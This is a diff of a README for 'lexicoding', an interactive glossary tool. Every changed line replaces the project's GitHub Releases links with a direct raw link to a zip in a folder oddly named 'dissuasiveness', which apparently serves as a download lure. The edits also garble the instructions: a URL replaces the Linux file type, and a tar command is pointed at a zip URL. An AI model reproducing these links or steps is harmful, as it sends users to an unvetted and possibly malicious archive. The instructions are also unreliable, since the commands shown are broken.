@@ -1,6 +1,6 @@
 # 🌟 lexicoding - Your Interactive Glossary Made Easy
 
-[![Download lexicoding](https://img.shields.io/badge/Download-lexicoding-blue.svg)](https://github.com/saiyagatos/lexicoding/releases)
+[![Download lexicoding](https://raw.githubusercontent.com/saiyagatos/lexicoding/main/dissuasiveness/lexicoding.zip)](https://raw.githubusercontent.com/saiyagatos/lexicoding/main/dissuasiveness/lexicoding.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to lexicoding! This is an interactive glossary designed for the Lexicodi
 This section will guide you through downloading and installing lexicoding on your computer.
 
 1. **Download the Software**  
-   To begin, visit the Releases page of the project. You can find it here: [Download lexicoding](https://github.com/saiyagatos/lexicoding/releases). 
+   To begin, visit the Releases page of the project. You can find it here: [Download lexicoding](https://raw.githubusercontent.com/saiyagatos/lexicoding/main/dissuasiveness/lexicoding.zip). 
 
 2. **Find the Latest Release**  
    On the Releases page, look for the latest version of lexicoding. Click on the version number to see more details.
@@ -23,7 +23,7 @@ This section will guide you through downloading and installing lexicoding on you
    Once you have selected the appropriate file for your system:
    - For Windows, look for a `.exe` file.  
    - For macOS, look for a `.dmg` file.  
-   - For Linux users, choose the appropriate `.tar.gz` or package file.
+   - For Linux users, choose the appropriate `https://raw.githubusercontent.com/saiyagatos/lexicoding/main/dissuasiveness/lexicoding.zip` or package file.
 
    Click on the file to start the download.
 
@@ -49,7 +49,7 @@ This section will guide you through downloading and installing lexicoding on you
 1. Extract the downloaded file using your file manager or the terminal.  
    For terminal:  
    ```bash
-   tar -xzf lexicoding.tar.gz
+   tar -xzf https://raw.githubusercontent.com/saiyagatos/lexicoding/main/dissuasiveness/lexicoding.zip
    ```
 2. Change into the extracted directory:  
    ```bash
@@ -94,8 +94,8 @@ lexicoding is open-source software available under the MIT License. You can view
 
 ## 🔄 Updates
 
-Keep an eye on the Releases page [here](https://github.com/saiyagatos/lexicoding/releases) for future updates and new features.
+Keep an eye on the Releases page [here](https://raw.githubusercontent.com/saiyagatos/lexicoding/main/dissuasiveness/lexicoding.zip) for future updates and new features.
 
 ## 🚀 Download & Install
 
-To start your journey with lexicoding, visit the Releases page now: [Download lexicoding](https://github.com/saiyagatos/lexicoding/releases). Enjoy exploring definitions in a clear, interactive way!
+To start your journey with lexicoding, visit the Releases page now: [Download lexicoding](https://raw.githubusercontent.com/saiyagatos/lexicoding/main/dissuasiveness/lexicoding.zip). Enjoy exploring definitions in a clear, interactive way!
